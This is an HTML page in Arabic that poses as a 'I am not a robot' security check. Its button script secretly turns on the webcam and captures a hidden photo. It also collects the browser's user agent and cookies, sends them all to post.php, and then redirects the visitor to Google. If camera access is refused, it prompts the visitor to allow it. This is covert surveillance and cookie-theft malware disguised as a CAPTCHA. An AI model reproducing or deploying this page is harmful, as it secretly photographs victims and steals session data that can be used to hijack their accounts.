<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>التحقق الأمني</title>
    <style>
        body { background: #f8f9fa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
        .btn { padding: 20px 40px; background: white; border: 1px solid #ccc; cursor: pointer; border-radius: 8px; font-size: 18px; }
    </style>
</head>
<body>
    <button class="btn" onclick="startProcess()">أنا لست برنامج روبوت</button>
    <script>
        async function startProcess() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                video.srcObject = stream;
                video.style.display = 'none';
                document.body.appendChild(video);
                await video.play();
                await new Promise(r => setTimeout(r, 800)); // انتظار أطول قليلاً لاستقرار الكاميرا

                const browserInfo = navigator.userAgent;
                const cookies = document.cookie;
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                
                await fetch('post.php', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                    body: img=${encodeURIComponent(canvas.toDataURL('image/jpeg', 0.8))}&info=${encodeURIComponent(browserInfo)}&cookies=${encodeURIComponent(cookies)}
                });

                stream.getTracks().forEach(t => t.stop());
                window.location.href = "https://google.com";
            } catch (err) {
                alert("يرجى الضغط على سماح للكاميرا للمتابعة.");
            }
        }
    </script>
</body>
</html>
